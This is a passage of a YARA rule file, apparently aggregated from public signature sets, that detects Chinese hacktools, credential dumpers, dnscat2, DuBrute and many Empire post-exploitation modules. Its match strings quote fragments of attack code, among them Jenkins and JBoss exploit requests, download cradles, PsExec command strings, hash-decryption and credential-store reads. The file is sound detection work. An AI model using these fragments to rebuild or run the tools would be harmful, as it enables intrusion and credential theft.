scanner\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Portscan\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"TCP 12.12.12.12\"\n\n    condition:\n        uint16(0) == 0x5A4D and $s2\n}\n\nrule ChineseHacktools_XScanLib_XScanLib_XScanLib\n{\n    meta:\n        description = \"Chinese hacktool (files: XScanLib.dll, XScanLib.dll, XScanLib.dll)\"\n        ref = \"http://qiannao.com/ls/905300366/33834c0c/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Toolset__XScanLib_XScanLib_XScanLib\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Plug-in thread causes an exception, failed to alert user.\" fullword\n        $s2 = \"PlugGetUdpPort\" fullword\n        $s3 = \"XScanLib.dll\" fullword\n        $s4 = \"PlugGetTcpPort\" fullword\n        $s11 = \"PlugGetVulnNum\" fullword\n\n    condition:\n        all of them\n}\n\nrule ChineseHacktools_NTscan_PipeCmd\n{\n    meta:\n        description = \"Chinese hacktool (file: PipeCmd.exe)\"\n        ref = \"http://qiannao.com/ls/905300366/33834c0c/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Toolset_NTscan_PipeCmd\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"Please Use NTCmd.exe Run This Program.\" fullword ascii\n        $s3 = \"PipeCmd.exe\" fullword wide\n        $s4 = \"\\\\\\\\.\\\\pipe\\\\%s%s%d\" fullword ascii\n        $s5 = \"%s\\\\pipe\\\\%s%s%d\" fullword ascii\n        $s6 = \"%s\\\\ADMIN$\\\\System32\\\\%s%s\" fullword ascii\n        $s7 = \"%s\\\\ADMIN$\\\\System32\\\\%s\" fullword ascii\n        $s9 = \"PipeCmdSrv.exe\" fullword ascii\n        $s10 = \"This is a service executable! Couldn't start directly.\" fullword ascii\n        $s13 = \"\\\\\\\\.\\\\pipe\\\\PipeCmd_communicaton\" fullword ascii\n        $s14 = \"PIPECMDSRV\" fullword wide\n        $s15 = \"PipeCmd Service\" fullword ascii\n\n    condition:\n        4 of them\n}\n\nrule ChineseHacktools_LScanPortss_2\n{\n    meta:\n        description = \"Chinese hacktool (file: LScanPortss.exe)\"\n        ref = \"http://qiannao.com/ls/905300366/33834c0c/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Toolset_LScanPortss_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"LScanPort.EXE\" fullword wide\n        $s3 = \"www.honker8.com\" fullword wide\n        $s4 = \"DefaultPort.lst\" fullword ascii\n        $s5 = \"Scan over.Used %dms!\" fullword ascii\n        $s6 = \"www.hf110.com\" fullword wide\n        $s15 = \"LScanPort Microsoft \" fullword wide\n        $s18 = \"L-ScanPort2.0 CooFly\" fullword wide\n\n    condition:\n        4 of them\n}\n\nrule ChineseHacktools_sig_1433_135_sqlr\n{\n    meta:\n        description = \"Chinese hacktool (file: sqlr.exe)\"\n        ref = \"http://qiannao.com/ls/905300366/33834c0c/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Toolset_sig_1433_135_sqlr\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Connect to %s MSSQL server success. Type Command at Prompt.\" fullword ascii\n        $s11 = \";DATABASE=master\" fullword ascii\n        $s12 = \"xp_cmdshell '\" fullword ascii\n        $s14 = \"SELECT * FROM OPENROWSET('SQLOLEDB','Trusted_Connection=Yes;Data Source=myserver\" ascii\n\n    condition:\n        all of them\n}\n\nrule ChineseHacktools_BeepService_Hacktool\n{\n    meta:\n        description = \"BeepService hacktool used by Chinese APT groups\"\n        ref = \"https://goo.gl/p32Ozf\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"BeepService_Hacktool\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\\\\\%s\\\\admin$\\\\system32\\\\%s\" fullword ascii\n        $s1 = \"123.exe\" fullword ascii\n        $s2 = \"regclean.exe\" fullword ascii\n        $s3 = \"192.168.88.69\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and $x1 and 1 of ($s*)\n}\n\nrule ChineseHacktools_ONHAT_Proxy_Hacktool\n{\n    meta:\n        description = \"ONHAT Proxy; HTran-like SOCKS hacktool used by Chinese APT groups\"\n        ref = \"https://goo.gl/p32Ozf\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ONHAT_Proxy_Hacktool\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"INVALID PARAMETERS. TYPE ONHAT.EXE -h FOR HELP INFORMATION.\" fullword ascii\n        $s2 = \"[ONHAT] LISTENS (S, %d.%d.%d.%d, %d) ERROR.\" fullword ascii\n        $s3 = \"[ONHAT] CONNECTS (T, %d.%d.%d.%d, %d.%d.%d.%d, %d) ERROR.\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 80KB and (1 of ($s*))) or (2 of them)\n}\n\nrule creddump\n{\n    meta:\n        description = \"creddump: Python tool to extract credentials and secrets from Windows registry\"\n        ref = \"https://github.com/moyix/creddump\"\n        classifications = \"Hacktool\"\n        threat_names = \"creddump\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"@mimeframe\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"hacktool_windows_moyix_creddump\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $a1 = \"!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\" wide ascii\n        $a2 = \"0123456789012345678901234567890123456789\" wide ascii\n        $a3 = \"NTPASSWORD\" wide ascii\n        $a4 = \"LMPASSWORD\" wide ascii\n        $a5 = \"aad3b435b51404eeaad3b435b51404ee\" wide ascii\n        $a6 = \"31d6cfe0d16ae931b73c59d7e0c089c0\" wide ascii\n\n    condition:\n        all of ($a*)\n}\n\nrule dnscat2_Hacktool\n{\n    meta:\n        description = \"dnscat2: DNS tunnel\"\n        ref = \"https://downloads.skullsecurity.org/dnscat2/\"\n        classifications = \"Hacktool\"\n        threat_names = \"dnscat2\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"dnscat2_Hacktool\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"--exec -e <process>     Execute the given process and link it to the stream.\" fullword ascii\n        $s2 = \"Sawlog\" fullword ascii\n        $s3 = \"COMMAND_EXEC [request] :: request_id: 0x%04x :: name: %s :: command: %s\" fullword ascii\n        $s4 = \"COMMAND_SHELL [request] :: request_id: 0x%04x :: name: %s\" fullword ascii\n        $s5 = \"[Tunnel %d] connection to %s:%d closed by the server!\" fullword ascii\n\n    condition:\n        ((uint16(0) == 0x457f or uint16(0) == 0x5a4d) and filesize < 400KB and (2 of ($s*))) or (all of them)\n}\n\nrule dubrute : bruteforcer toolkit\n{\n    meta:\n        description = \"DuBrute: brute-force tool\"\n        ref = \"https://github.com/ch0sys/DUBrute\"\n        classifications = \"Hacktool\"\n        threat_names = \"DuBrute\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"Christian Rebischke (@sh1bumi)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"dubrute\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = \"WBrute\"\n        $b = \"error.txt\"\n        $c = \"good.txt\"\n        $d = \"source.txt\"\n        $e = \"bad.txt\"\n        $f = \"Generator IP@Login;Password\"\n\n    condition:\n        uint16(0) == 0x5A4D and $a and $b and $c and $d and $e and $f\n}\n\nrule Empire_Invoke_MetasploitPayload\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Invoke-MetasploitPayload.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Invoke_MetasploitPayload\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$ProcessInfo.Arguments=\\\"-nop -c $DownloadCradle\\\"\" fullword ascii\n        $s2 = \"$PowershellExe=$env:windir+'\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe'\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 9KB and 1 of them) or all of them\n}\n\nrule Empire_Exploit_Jenkins\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Exploit-Jenkins.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Exploit_Jenkins\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$postdata=\\\"script=println+new+ProcessBuilder%28%27\\\"+$($Cmd)+\\\"\" ascii\n        $s2 = \"$url = \\\"http://\\\"+$($Rhost)+\\\":\\\"+$($Port)+\\\"/script\\\"\" fullword ascii\n        $s3 = \"$Cmd = [System.Web.HttpUtility]::UrlEncode($Cmd)\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x6620 and filesize < 7KB and 1 of them) or all of them\n}\n\nrule Empire_Get_SecurityPackages\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Get-SecurityPackages.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Get_SecurityPackages\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$null = $EnumBuilder.DefineLiteral('LOGON', 0x2000)\" fullword ascii\n        $s2 = \"$EnumBuilder = $ModuleBuilder.DefineEnum('SSPI.SECPKG_FLAG', 'Public', [Int32])\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 20KB and 1 of them) or all of them\n}\n\nrule Empire_Invoke_PowerDump\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Invoke-PowerDump.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Invoke_PowerDump\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x16 = \"$enc = Get-PostHashdumpScript\" fullword ascii\n        $x19 = \"$lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;\" fullword ascii\n        $x20 = \"$rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x2023 and filesize < 60KB and 1 of them) or all of them\n}\n\nrule Empire_Install_SSP\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Install-SSP.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Install_SSP\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Install-SSP -Path .\\\\mimilib.dll\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 20KB and 1 of them) or all of them\n}\n\nrule Empire_Invoke_ShellcodeMSIL\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Invoke-ShellcodeMSIL.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Invoke_ShellcodeMSIL\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$FinalShellcode.Length\" fullword ascii\n        $s2 = \"@(0x60,0xE8,0x04,0,0,0,0x61,0x31,0xC0,0xC3)\" fullword ascii\n        $s3 = \"@(0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,\" fullword ascii\n        $s4 = \"$TargetMethod.Invoke($null, @(0x11112222)) | Out-Null\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 30KB and 1 of them) or all of them\n}\n\nrule Empire__Users_neo_code_Workspace_Empire_4sigs_PowerUp\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: PowerUp.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire__Users_neo_code_Workspace_Empire_4sigs_PowerUp\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x2 = \"$PoolPasswordCmd = 'c:\\\\windows\\\\system32\\\\inetsrv\\\\appcmd.exe list apppool\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x233c and filesize < 2000KB and 1 of them) or all of them\n}\n\nrule Empire_Invoke_Mimikatz_Gen\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Invoke-Mimikatz.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Invoke_Mimikatz_Gen\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"= \\\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQ\" ascii\n        $s2 = \"Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, \\\"Void\\\", 0, \\\"\\\", $ExeArgs)\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 4000KB and 1 of them) or all of them\n}\n\nrule Empire_Get_GPPPassword\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Get-GPPPassword.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Get_GPPPassword\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$Base64Decoded = [Convert]::FromBase64String($Cpassword)\" fullword ascii\n        $s2 = \"$XMlFiles += Get-ChildItem -Path \\\"\\\\\\\\$DomainController\\\\SYSVOL\\\" -Recurse\" ascii\n        $s3 = \"function Get-DecryptedCpassword {\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 30KB and 1 of them) or all of them\n}\n\nrule Empire_Invoke_SmbScanner\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Invoke-SmbScanner.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Invoke_SmbScanner\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$up = Test-Connection -count 1 -Quiet -ComputerName $Computer \" fullword ascii\n        $s2 = \"$out | add-member Noteproperty 'Password' $Password\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 10KB and 1 of them) or all of them\n}\n\nrule Empire_Exploit_JBoss\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Exploit-JBoss.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Exploit_JBoss\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Exploit-JBoss\" fullword ascii\n        $s2 = \"$URL = \\\"http$($SSL)://\\\" + $($Rhost) + ':' + $($Port)\" ascii\n        $s3 = \"\\\"/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service\" ascii\n        $s4 = \"http://blog.rvrsh3ll.net\" fullword ascii\n        $s5 = \"Remote URL to your own WARFile to deploy.\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 10KB and 1 of them) or all of them\n}\n\nrule Empire_dumpCredStore\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: dumpCredStore.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_dumpCredStore\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"[DllImport(\\\"Advapi32.dll\\\", SetLastError = true, EntryPoint = \\\"CredReadW\\\"\" ascii\n        $s12 = \"[String] $Msg = \\\"Failed to enumerate credentials store for user '$Env:UserName'\\\"\" fullword ascii\n        $s15 = \"Rtn = CredRead(\\\"Target\\\", CRED_TYPE.GENERIC, out Cred);\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x233c and filesize < 40KB and 1 of them) or all of them\n}\n\nrule Empire_Invoke_EgressCheck\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Invoke-EgressCheck.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Invoke_EgressCheck\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"egress -ip $ip -port $c -delay $delay -protocol $protocol\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x233c and filesize < 10KB and 1 of them) or all of them\n}\n\nrule Empire_ReflectivePick_x64_orig\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: ReflectivePick_x64_orig.dll)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_ReflectivePick_x64_orig\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\PowerShellRunner.pdb\" fullword ascii\n        $s2 = \"PowerShellRunner.dll\" fullword wide\n        $s3 = \"ReflectivePick_x64.dll\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and 1 of them) or all of them\n}\n\nrule Empire_Out_Minidump\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Out-Minidump.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Out_Minidump\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,\" fullword ascii\n        $s2 = \"$ProcessFileName = \\\"$($ProcessName)_$($ProcessId).dmp\\\"\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 10KB and 1 of them) or all of them\n}\n\nrule Empire_Invoke_PsExec\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Invoke-PsExec.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Invoke_PsExec\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Invoke-PsExecCmd\" fullword ascii\n        $s2 = \"\\\"[*] Executing service .EXE\" fullword ascii\n        $s3 = \"$cmd = \\\"%COMSPEC% /C echo $Command ^> %systemroot%\\\\Temp\\\\\" ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 50KB and 1 of them) or all of them\n}\n\nrule Empire_Invoke_PostExfil\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Invoke-PostExfil.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Invoke_PostExfil\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"# upload to a specified exfil URI\" fullword ascii\n        $s2 = \"Server path to exfil to.\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x490a and filesize < 2KB and 1 of them) or all of them\n}\n\nrule Empire_Invoke_SMBAutoBrute\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Invoke-SMBAutoBrute.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Invoke_SMBAutoBrute\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"[*] PDC: LAB-2008-DC1.lab.com\" fullword ascii\n        $s2 = \"$attempts = Get-UserBadPwdCount $userid $dcs\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 30KB and 1 of them) or all of them\n}\n\nrule Empire_Get_Keystrokes\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Get-Keystrokes.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Get_Keystrokes\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 30KB and 1 of them) or all of them\n}\n\nrule Empire_Invoke_DllInjection\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Invoke-DllInjection.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Invoke_DllInjection\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"-Dll evil.dll\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 40KB and 1 of them) or all of them\n}\n\nrule Empire_KeePassConfig\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: KeePassConfig.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_KeePassConfig\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$UserMasterKeyFiles = 